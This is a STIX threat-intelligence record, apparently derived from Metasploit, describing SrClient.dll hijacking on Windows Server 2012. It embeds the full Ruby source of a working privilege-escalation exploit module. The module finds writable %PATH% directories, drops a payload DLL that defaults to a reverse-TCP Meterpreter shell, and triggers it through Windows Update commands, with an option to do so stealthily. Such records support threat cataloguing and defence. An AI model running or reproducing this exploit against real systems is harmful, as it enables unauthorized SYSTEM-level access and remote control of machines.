{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0904e305-aa4a-401c-a945-d9feb9ac6250",
    "created": "2024-08-14T16:49:49.525794Z",
    "modified": "2024-08-14T16:49:49.525798Z",
    "name": "Windows Server 2012 SrClient DLL hijacking",
    "description": " All editions of Windows Server 2012 (but not 2012 R2) are vulnerable to DLL hijacking due to the way TiWorker.exe will try to call the non-existent `SrClient.dll` file when Windows Update checks for updates. This issue can be leveraged for privilege escalation if %PATH% includes directories that are writable by low-privileged users. The attack can be triggered by any low-privileged user and does not require a system reboot.  This module has been successfully tested on Windows Server 2012 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/srclient_dll_hijacking.rb",
            "external_id": "srclient_dll_hijacking.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.vonahi.io/srclient-dll-hijacking"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Server 2012 SrClient DLL hijacking',\n        'Description' => %q{\n          All editions of Windows Server 2012 (but not 2012 R2) are vulnerable to DLL\n          hijacking due to the way TiWorker.exe will try to call the non-existent\n          `SrClient.dll` file when Windows Update checks for updates. This issue can be\n          leveraged for privilege escalation if %PATH% includes directories that are\n          writable by low-privileged users. The attack can be triggered by any\n          low-privileged user and does not require a system reboot.\n\n          This module has been successfully tested on Windows Server 2012 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Erik Wynter' # @wyntererik - Discovery & Metasploit\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => {\n          'Wfsdelay' => 60,\n          'EXITFUNC' => 'thread'\n        },\n        'Targets' => [\n          [\n            'Windows Server 2012 (x64)', {\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'References' => [\n          [ 'URL', 'https://blog.vonahi.io/srclient-dll-hijacking' ],\n        ],\n        'DisclosureDate' => '2021-02-19',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, SCREEN_EFFECTS ],\n          'Reliability' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getuid\n              stdapi_sys_process_get_processes\n            ]\n          }\n        }\n      )\n      )\n\n    register_options([\n      OptString.new('WRITABLE_PATH_DIR', [false, 'Path to a writable %PATH% directory to write the payload to.', '']),\n      OptBool.new('STEALTH_ONLY', [false, 'Only exploit if the payload can be triggered without launching the Windows Update UI) ', false]),\n      OptInt.new('WAIT_FOR_TIWORKER', [false, 'No. of minutes to wait for TiWorker.exe to finish running if it is already active. ', 0])\n    ])\n  end\n\n  def provided_path_dir\n    datastore['WRITABLE_PATH_DIR']\n  end\n\n  def stealth_only\n    datastore['STEALTH_ONLY']\n  end\n\n  def wait_for_tiworker\n    datastore['WAIT_FOR_TIWORKER']\n  end\n\n  def force_exploit_message\n    \" If #{provided_path_dir} should be writable and part of %PATH%, enter `set ForceExploit true` and rerun the module.\"\n  end\n\n  def grab_user_groups(current_user)\n    print_status(\"Obtaining group information for the current user #{current_user}...\")\n\n    # add current user to the groups we are a member of in case user-specific permissions are set for any of the %PATH% directories\n    user_groups = [current_user]\n\n    whoami_groups = get_whoami\n\n    unless whoami_groups.blank?\n      print_status('')\n      whoami_groups.split(\"\\r\\n\").each do |line|\n        exclude_strings = ['----', '====', 'GROUP INFORMATION', 'Group Name', 'Mandatory Label']\n        line = line.strip\n        next if line.empty?\n        next if exclude_strings.any? { |ex_str| line.include?(ex_str) }\n\n        group = line.split('   ')[0]\n        user_groups << group\n        print_status(\"\\t#{group}\")\n      end\n\n      print_status('')\n    end\n    user_groups\n  end\n\n  def find_pdir_owner(pdir, current_user)\n    # we need double backslashes in the path for wmic, using block gsub because regular gsub doesn't seem to work\n    pdir_escaped = pdir.gsub(/\\\\/) { '\\\\\\\\' }\n    pdir_owner_info = cmd_exec(\"wmic path Win32_LogicalFileSecuritySetting where Path=\\\"#{pdir_escaped}\\\" ASSOC /RESULTROLE:Owner /ASSOCCLASS:Win32_LogicalFileOwner /RESULTCLASS:Win32_SID\")\n    if pdir_owner_info.blank? || pdir_owner_info.split('{')[0].blank?\n      return false\n    end\n\n    pdir_owner_suffix = pdir_owner_info.split('{')[0]\n    pdir_owner_prefix = pdir_owner_info.scan(/\\}\\s+(.*?)S-\\d-\\d+-(\\d+-){1,14}\\d/).flatten.first\n\n    if pdir_owner_prefix.blank? || pdir_owner_suffix.blank?\n      return false\n    end\n\n    pdir_owner_name = \"#{pdir_owner_prefix.strip}\\\\#{pdir_owner_suffix.strip}\"\n    if pdir_owner_name.downcase == current_user.downcase\n      return true\n    else\n      return false\n    end\n  end\n\n  def enumerate_writable_path_dirs(path_dirs, user_groups, current_user)\n    writable_path_dirs = []\n    perms_we_need = ['(F)', '(M)']\n    print_status('')\n\n    path_dirs.split(';').each do |pdir|\n      next if pdir.blank? || pdir.strip.blank?\n\n      # directories can't and with a backslash, otherwise some commands will throw an error\n      pdir = pdir.strip.delete_suffix('\\\\')\n\n      # if the user has provided a target dir, only look at that one\n      if !provided_path_dir.blank? && pdir.downcase != provided_path_dir.downcase\n        next\n      end\n\n      print_status(\"\\tChecking permissions for #{pdir}\")\n\n      # check if the current user owns pdir\n      user_owns_pdir = find_pdir_owner(pdir, current_user)\n\n      # use icalcs to get the directory permissions\n      permissions = cmd_exec(\"icacls \\\"#{pdir}\\\"\")\n      next if permissions.blank?\n      next if permissions.split(pdir.to_s)[1] && permissions.split(pdir.to_s)[1].length < 2\n\n      # the output should always start with the provided directory, so we need to remove that\n      groups_perms = permissions.split(pdir.to_s)[1].strip\n      next if groups_perms.empty?\n\n      # iterate over the listed permissions for different groups\n      groups_perms.split(\"\\n\").each do |gp|\n        gp = gp.strip\n\n        # the format should be <group>:<perms>, so gp must always include `:`\n        next unless gp.include?(':')\n\n        # grab the group name and permissions\n        group, perms = gp.split(':')\n        next if group.blank? || perms.blank?\n\n        group = group.strip\n        perms = perms.strip\n\n        # if the current user owns the directory, check for the directory permissions as well\n        if user_owns_pdir && group == 'CREATOR OWNER' && perms_we_need.any? { |prm| perms.downcase.include? prm.downcase }\n          writable_path_dirs << pdir unless writable_path_dirs.include?(pdir)\n          next\n        end\n\n        # ignore groups that don't match the groups for the current user, or the required permissions\n        next unless user_groups.any? { |ug| group.downcase == ug.downcase }\n        next unless perms_we_need.any? { |prm| perms.downcase.include? prm.downcase }\n\n        # if we are here, we found a %PATH% directory we can write to!!!\n        writable_path_dirs << pdir unless writable_path_dirs.include?(pdir)\n      end\n    end\n\n    print_status('')\n\n    writable_path_dirs\n  end\n\n  def exploitation_message(trigger_cmd)\n    if trigger_cmd == 'wuauclt /detectnow'\n      print_status(\"Trying to trigger the payload in the background via the shell command `#{trigger_cmd}`\")\n    else\n      print_status(\"Trying to trigger the payload via the shell command `#{trigger_cmd}`\")\n    end\n  end\n\n  def monitor_tiworker\n    print_warning(\"TiWorker.exe is already running on the target. The module will monitor the process every 10 seconds for up to #{wait_for_tiworker} minute(s)...\")\n    wait_time_left = wait_for_tiworker\n    sleep_time = 0\n    while wait_time_left > 0\n      sleep 10\n\n      host_processes = client.sys.process.get_processes\n      if host_processes.none? { |ps| ps['name'] == 'TiWorker.exe' }\n        print_status('TiWorker.exe is no longer running on the target. Proceding with exploitation.')\n        break\n      end\n\n      sleep_time += 10\n      next unless sleep_time == 60\n\n      wait_time_left -= 1\n      sleep_time = 0\n      print_status(\"TiWorker.exe is still running on the target. The module will keep checking for #{wait_time_left} minute(s)...\")\n    end\n  end\n\n  def check\n    version = get_version_info\n    unless version.build_number == Msf::WindowsVersion::Server2012 && version.windows_server?\n      return Exploit::CheckCode::Safe('Target is not Windows Server 2012.')\n    end\n\n    print_status(\"Target is #{version.product_name}\")\n\n    # obtain the Windows Update setting to see if exploitation could work at all\n    @wupdate_setting = registry_getvaldata('HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WindowsUpdate\\\\Auto Update', 'AUOptions')\n\n    if @wupdate_setting.nil?\n      # if this is true, Windows Update has probably never been configured on the target, and the attack most likely won't work.\n      return Exploit::CheckCode::Safe('Target is Windows Server 2012, but cannot be exploited because Windows Update has not been configured.')\n    end\n\n    unless (1..4).include?(@wupdate_setting)\n      return Exploit::CheckCode::Unknown('Received unexpected reply when trying to obtain the Windows Update setting.')\n    end\n\n    # get groups for the current user, this is necessary to verify write permissions\n    current_user = session.sys.config.getuid\n    user_groups = grab_user_groups(current_user)\n\n    # get %PATH% dirs and check if the current user can write to them\n    print_status('Checking for writable directories in %PATH%...')\n    # we can't use get_envs('PATH') here because that returns all PATH directories, but we only need those in the SYSTEM PATH\n    path_dirs = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment', 'path')\n\n    if path_dirs.blank?\n      get_path_fail_message = 'Failed to obtain %PATH% directories.'\n      unless provided_path_dir.blank?\n        get_path_fail_message << force_exploit_message\n      end\n      return Exploit::CheckCode::Unknown(get_path_fail_message)\n    end\n\n    @writable_path_dirs = enumerate_writable_path_dirs(path_dirs, user_groups, current_user)\n\n    writable_path_dirs_fail_message = \"#{current_user} does not seem to have write permissions to any of the %PATH% directories\"\n\n    if @writable_path_dirs.empty?\n      unless provided_path_dir.blank?\n        writable_path_dirs_fail_message << force_exploit_message\n      end\n      return Exploit::CheckCode::Safe(writable_path_dirs_fail_message)\n    end\n\n    if provided_path_dir.blank?\n      print_good(\"#{current_user} has write permissions to the following %PATH% directories:\")\n      print_status('')\n      @writable_path_dirs.each { |wpd| print_status(\"\\t#{wpd}\") }\n      print_status('')\n    else\n      print_good(\"#{current_user} has write permissions to #{provided_path_dir}\")\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    payload_arch = payload.arch.first\n    if (payload_arch != ARCH_X64)\n      fail_with(Failure::BadConfig, \"Unsupported payload architecture (#{payload_arch}). Only 64-bit (x64) payloads are supported.\") # Unsupported architecture, so return an error.\n    end\n\n    # check if TiWorker.exe is already running, in which case exploitation will fail\n    host_processes = client.sys.process.get_processes\n    if host_processes.any? { |ps| ps['name'] == 'TiWorker.exe' }\n      unless wait_for_tiworker > 0\n        fail_with(Failure::Unknown, 'TiWorker.exe is already running on the target. Set `WAIT_FOR_TIWORKER` to force the module to wait for the process to finish.')\n      end\n\n      monitor_tiworker\n    end\n\n    # There are three commands we can run to get the target to start checking for Windows updates, which should launch TiWorker.exe and trigger the payload as SYSTEM\n    ## 'wuauclt /detectnow': This triggers the payload in the background, but won't work when Windows Update is set to never check for updates.\n    ## 'wuauclt /selfupdatemanaged': This triggers the payload by launching the Windows Update UI, which then scans for updates using the WSUS settings. This is not stealthy, but works with all Windows Update settings.\n    ## 'wuauclt /selfupdateunmanaged': This triggers the payload by launching the Windows Update UI, which then scans for updates using the Windows Update site. This is not stealthy, but works with all Windows Update settings.\n    ## the module prefers /selfupdatemanaged over /selfupdateunmanaged when /detectnow is not possible because /selfupdateunmanaged may require the target to be able to reach the Windows Update server\n\n    case @wupdate_setting\n    when 1\n      print_warning('Because Windows Update is set to never check for updates, triggering the payload requires launching the Windows Update window on the target.')\n      if stealth_only\n        fail_with(Failure::Unknown, 'Exploitation cannot proceed stealthily. If you still want to exploit, set `STEALTH_ONLY` to false.')\n        return\n      end\n      trigger_cmd = 'wuauclt /selfupdatemanaged'\n    when 2..4\n      # trigger the payload in the background if we can\n      trigger_cmd = 'wuauclt /detectnow'\n    else\n      # if this is true, ForceExploit has been set and we should just roll with it\n      print_warning('Windows Update is not configured or returned an unexpected value. Exploitation may not work.')\n      if stealth_only\n        trigger_cmd = 'wuauclt /detectnow'\n      else\n        # go out guns blazing and hope for the best\n        print_status('The module will launch the Windows Update window on the target in an attempt to trigger the payload.')\n        trigger_cmd = 'wuauclt /selfupdatemanaged'\n      end\n    end\n\n    # select a target directory to write the payload to\n    if @writable_path_dirs.empty? # this means ForceExploit is being used\n      if provided_path_dir.blank?\n        fail_with(Failure::BadConfig, 'Using ForceExploit requires `WRITABLE_PATH_DIR` to be set.')\n      end\n\n      dll_path = provided_path_dir\n    else\n      dll_path = @writable_path_dirs[0]\n    end\n\n    # generate and write payload\n    dll_path << '\\\\' unless dll_path.end_with?('\\\\')\n    @dll_file_path = \"#{dll_path}SrClient.dll\"\n    dll = generate_payload_dll\n\n    print_status(\"Writing #{dll.length} bytes to #{@dll_file_path}...\")\n    begin\n      # write_file(@dll_file_path, dll)\n      write_file(@dll_file_path, dll)\n      register_file_for_cleanup(@dll_file_path)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      # Can't write the file, can't go on\n      fail_with(Failure::Unknown, e.message)\n    end\n\n    # trigger the payload\n    exploitation_message(trigger_cmd)\n    cmd_exec(trigger_cmd)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-02-19",
    "x_mitre_platforms": [
        "win'"
    ]
}